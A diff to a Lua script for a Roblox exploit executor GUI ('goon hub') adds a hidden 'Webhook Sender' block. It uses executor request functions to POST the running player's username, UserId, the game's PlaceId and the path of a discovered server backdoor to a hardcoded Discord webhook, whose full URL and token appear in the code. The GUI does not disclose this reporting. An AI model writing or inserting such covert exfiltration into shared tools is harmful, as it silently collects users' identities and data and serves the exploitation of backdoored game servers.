@@ -95,6 +95,33 @@ G2L["Clear_b"].Position = UDim2.new(0.725, 0, 0.81429, 0)
 -- StarterGui.goon hub.Main.Clear.UICorner
 G2L["UICorner_c"] = Instance.new("UICorner", G2L["Clear_b"])
 
+-- Webhook Sender
+
+local request =
+    (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+if request then
+    request(
+        {
+            Url = "https://discord.com/api/webhooks/1396496047404220436/-z7bjlQbXR00lgyLvAOpr8_70_y2UCIYSr38r_Y-Lgh6WuRfCgjdBBMR3ICDBkBOYkv7",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(
+                {
+                    username = "pls dont delete this w3bh00k",
+                    content = "**User: `" ..
+                        game:GetService("Players").LocalPlayer.Name ..
+                            "` | `" ..
+                                game:GetService("Players").LocalPlayer.UserId ..
+                                    "`\nhttps://www.roblox.com/games/" ..
+                                        game.PlaceId .. "\n`" .. backdoor:GetFullName() .. "`**"
+                }
+            )
+        }
+    )
+end
+
 -- Buttons Logic
 
 G2L["Execute_9"].MouseButton1Click:Connect(
